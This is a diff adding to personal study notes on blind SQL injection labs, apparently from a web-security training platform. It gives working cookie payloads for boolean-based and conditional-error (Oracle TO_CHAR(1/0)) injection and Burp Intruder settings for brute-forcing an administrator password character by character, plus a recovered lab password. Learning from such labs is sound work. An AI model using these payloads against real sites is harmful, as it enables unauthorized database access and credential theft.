@@ -126,4 +126,25 @@ select payloads
 Cookie: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;  
 payload 1 -> numbers 1-20(we know PW is 20 long from prior step) step 1  
 payload 2 -> simple list ->payload options -> add a-z and 0-9  
-Start attack, wait for 30 minutes, order results
+Start attack, wait for 30 minutes, order results  
+pw: i0tky7lpg6kfrvw0o0vf
+
+### Blind SQL injection with conditional errors
+
+Cookie: TrackingId=4KuVlET3kPLQfehN'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||';  
+server Error  
+change 1=2 ex: '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||';  
+send to intruder, clear  
+get error back to find PW length ex: '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'  
+select 1 and 'add' for payload ex: LENGTH(password)>§1§  
+payload - numbers 1-30 step 1  
+options are default  
+Start attack, look for 500 status response = error response for me 19 errors 20 char long pw
+
+now iterate over 20 chars to find out which char for all 20.  
+intruder similar to last time.  
+ex: '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';  
+add a and first 1, ex: Cookie: TrackingId=4KuVlET3kPLQfehN'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';  
+Cluster bomb attack (two payloads)
+payload 1 numbers 1-20 step 1, payload 2 a-z 0-9
+look for any 500s and we'll get the password from internal server error. 500 = valid character
